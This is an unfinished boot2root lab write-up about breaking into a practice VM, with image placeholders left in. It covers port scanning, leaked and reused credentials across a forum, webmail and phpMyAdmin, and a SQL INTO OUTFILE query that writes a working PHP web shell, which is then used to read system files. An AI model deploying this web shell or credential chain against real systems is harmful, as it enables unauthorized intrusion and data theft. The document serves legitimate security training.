# Boot2Root Writeup 1
> Summary: This project is an introduction to system penetration.

> After all your efforts you will finally be able to have fun! This project is therefore a basis for making you understand how you must proceed to penetrate a system over which you have legal rights. I strongly urge you to use all available methods to really break this iso. The correction will be limited but your ability to be able to use your iso will be greatly rewarded for you, especially beyond your score.

### Step 1 : Find the Virtual machine IP address and open ports
Using `nmap` we can scan the local network to find the virtual machine's IP
In our case the ip was
- `10.11.100.242`

After scanning that IP using nmap we see multiple open ports.
```
Nmap scan report for 10.11.100.242
Host is up (0.0073s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```
### Step 2 : Find an entrypoint on the website

After using dirbuster to find subdirectories on `https://10.11.100.242`
We find the following links:
- https://10.11.100.242/forum/
- https://10.11.100.242/phpmyadmin/
- https://10.11.100.242/webmail/

PLEASE INSERT IMAGES HERE
#### Getting access to the forum
While browsing the forum, we find a connection log posted as a post
A user mistakenly entered his password in the username field

INSERT FORUM ARTICLE PASSWORD IMAGE HERE

We try using this password for the user `lmezard`, also appearing in the logs.
And we get access to `lmezard`'s forum account with the credentials
- `lmezard`
- `!q\]Ej?*5K5cy*AJ`

#### Getting access to SquirrelMail
Whe then find an email linked to `lmezard`'s account on the forum
We guess `lmezard` is maybe using the same password with both account
Which is the case, so we get access to `lmezard`'s `squirrelMail` using credentials :
- `laurie@borntosec.net`
- `!q\]Ej?*5K5cy*AJ`

#### Getting access to phpMyAdmin
On `squirrelMail` we find a very important email :
```
Subject:  	DB Access
From:  	qudevide@mail.borntosec.net
Date:  	Thu, October 8, 2015 11:25 pm
To:  	laurie@borntosec.net
Priority:  	Normal
Options:  	View Full Header |  View Printable Version  | Download this as a file

Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```
From which we get the username and password to `phpMyAdmin`
- `root`
- `Fg-'kKXBj87E:aJ$`

#### Using phpMyadmin to inject commands
We can run custom `SQL` queries from `phpMyAdmin`
And we can read and write into files as the user `www-data`
So I crafted a custom `SQL` query that will create a php file,
exposed on `https://10.11.100.242/forum/templates_c/shell.php`
Here is the `SQL` query:
```SQL
select "<form action=''><input type='text' name='cmd' value='<?php echo $_GET['cmd'];?>'/><input type='submit'/></form></br><?php $output = shell_exec($_REQUEST['cmd']); echo '<textarea rows=100% cols=100%>'.$output.'</textarea>' ?>" into outfile "/var/www/forum/templates_c/shell.php";
```
This added php file will be executed and will allow us to send our custom shell commands to be executed and the result returned.

We want to see what users are present in the machine
We can either `cat /etc/passwd` or `ls /home/`

When we `ls /home/` we can find a directory called `LOOKATME` inside of which there is a file `password`
`cat /home/LOOKATME/password` will give us `lmezard:G!@M6f4Eatau{sF"`
So we can now log into lmezard user
- `lmezard`
- `G!@M6f4Eatau{sF"`

But these credentials won't work on `ssh`, so they must be for something else, so we try logging in as `lmezard` using `ftp`.